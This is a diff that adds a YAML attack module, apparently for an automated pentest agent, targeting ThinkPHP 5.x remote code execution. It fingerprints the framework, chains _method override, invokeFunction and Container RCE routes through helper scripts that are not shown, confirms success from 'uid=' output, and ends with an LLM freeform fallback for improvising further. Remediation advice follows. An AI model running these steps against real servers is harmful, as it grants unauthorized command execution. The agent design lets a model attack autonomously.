@@ -1,0 +1,127 @@
+skill_id: thinkphp_rce
+name: "ThinkPHP 远程命令执行"
+category: web_rce
+phase: foothold
+version: "2.0"
+
+match:
+  rules:
+    - fingerprint_contains: ["thinkphp"]
+    - fingerprint_contains: ["ThinkPHP"]
+    - evidence_contains: ["thinkphp"]
+    - evidence_contains: ["think\\app"]
+
+probes:
+  - id: confirm_thinkphp
+    description: "确认 ThinkPHP 框架及版本"
+    command: "bash {skill_dir}/scripts/probe_thinkphp.sh {ENDPOINT}"
+    timeout: 15
+    parse_rules:
+      - if_contains: ["ThinkPHP", "thinkphp"]
+        set: { thinkphp_confirmed: true }
+      - if_contains: ["ThinkPHP V5.0"]
+        set: { thinkphp_confirmed: true, tp_version: "5.0" }
+      - if_contains: ["ThinkPHP V5.1"]
+        set: { thinkphp_confirmed: true, tp_version: "5.1" }
+      - if_contains: ["10 yi nian"]
+        set: { thinkphp_confirmed: true }
+      - if_regex: "ThinkPHP V?(5\\.\\d+\\.\\d+)"
+        set: { thinkphp_confirmed: true }
+
+exploit_paths:
+  # Path A: _method override RCE (5.0.x)
+  - path_id: method_override
+    name: "_method 参数覆盖 RCE"
+    priority: 1
+    principle: |
+      通过 POST _method=__construct 覆盖 Request 属性，
+      设置 filter=system，server[REQUEST_METHOD]=命令。
+    conditions:
+      thinkphp_confirmed: true
+    steps:
+      - id: method_rce_captcha
+        description: "通过 captcha 路由触发 _method RCE"
+        command: "bash {skill_dir}/scripts/method_override_rce.sh {ENDPOINT} captcha"
+        timeout: 15
+        success_criteria:
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
+        on_success: method_whoami
+        on_fail: method_rce_index
+
+      - id: method_rce_index
+        description: "通过根路由触发 _method RCE"
+        command: "bash {skill_dir}/scripts/method_override_rce.sh {ENDPOINT} index"
+        timeout: 15
+        success_criteria:
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
+        on_success: method_whoami
+        on_fail: next_path
+
+      - id: method_whoami
+        description: "确认用户身份"
+        command: "bash {skill_dir}/scripts/method_whoami.sh {ENDPOINT}"
+        timeout: 15
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_tp_method_override"
+
+  # Path B: invokeFunction route RCE
+  - path_id: invoke_function
+    name: "invokeFunction 任意函数调用"
+    priority: 2
+    principle: |
+      兼容模式路由允许直接调用 think\app 的 invokeFunction 方法，
+      传入 call_user_func_array 调用 system/exec 等函数。
+    conditions:
+      thinkphp_confirmed: true
+    steps:
+      - id: invoke_50
+        description: "5.0.x invokeFunction RCE"
+        command: "bash {skill_dir}/scripts/invoke_function_rce.sh {ENDPOINT}"
+        timeout: 15
+        success_criteria:
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
+        on_success: conclude_success
+        on_fail: invoke_51
+        evidence_capture:
+          shell_type: "rce_tp_invoke_50"
+
+      - id: invoke_51
+        description: "5.1.x invokeFunction RCE"
+        command: "bash {skill_dir}/scripts/invoke_51_rce.sh {ENDPOINT}"
+        timeout: 15
+        success_criteria:
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
+        on_success: conclude_success
+        on_fail: invoke_container
+        evidence_capture:
+          shell_type: "rce_tp_invoke_51"
+
+      - id: invoke_container
+        description: "5.1.x Container RCE"
+        command: "bash {skill_dir}/scripts/container_rce.sh {ENDPOINT}"
+        timeout: 15
+        success_criteria:
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_tp_container"
+
+  # Path C: LLM freeform fallback
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      thinkphp_confirmed: true
+
+remediation: |
+  1. 升级 ThinkPHP 至 6.x 或最新 5.x 补丁版本
+  2. 关闭 debug 模式
+  3. 限制路由只匹配预定义的 controller/action
+  4. WAF 过滤 _method=__construct、\think\app 等特征
